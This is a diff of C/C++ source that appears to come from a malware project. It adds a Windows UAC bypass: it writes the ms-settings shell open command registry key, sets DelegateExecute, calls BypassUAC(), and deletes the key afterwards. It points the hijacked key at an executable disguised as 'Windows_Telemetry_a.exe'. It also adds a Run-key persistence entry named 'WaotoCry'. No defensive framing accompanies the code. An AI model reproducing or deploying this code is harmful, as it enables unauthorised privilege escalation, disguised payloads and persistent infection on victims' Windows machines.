@@ -3,23 +3,25 @@
 int add_double_data(char *new_process_path) {
 	int serach_number;
 	HKEY key;
-	HKEY hKey = nullptr;
+	//HKEY hKey = nullptr;
 	DWORD dwDisposition;
-	::RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
+	char cmd_path[] = "C:\\Users\\Security\\Desktop\\Windows_Telemetry_a.exe";
+	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &key, &dwDisposition);
 	char data[] = "Software\\Classes\\ms-settings\\Shell\\open\\command";
 	RegOpenKeyEx(HKEY_CURRENT_USER, data, 0, KEY_WRITE, &key);
-	RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
+	RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)cmd_path, strlen((const char*)cmd_path));
 	RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
 	BypassUAC();
 	Sleep(800);
 	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
+	RegCloseKey(key);
 	return 1;
 }
 
 int increase(char *start_process) {
 	HKEY A_Key;
 	DWORD dwDisposition;
-	char login_pth[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
+	char login_pth[] = " Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	::RegOpenKeyEx(HKEY_CURRENT_USER, login_pth, 0, KEY_WRITE, &A_Key);
 	::RegSetValueEx(A_Key, "WaotoCry", 0, REG_SZ, (BYTE*)start_process, strlen((const char*)start_process));
 	::RegCloseKey(A_Key);
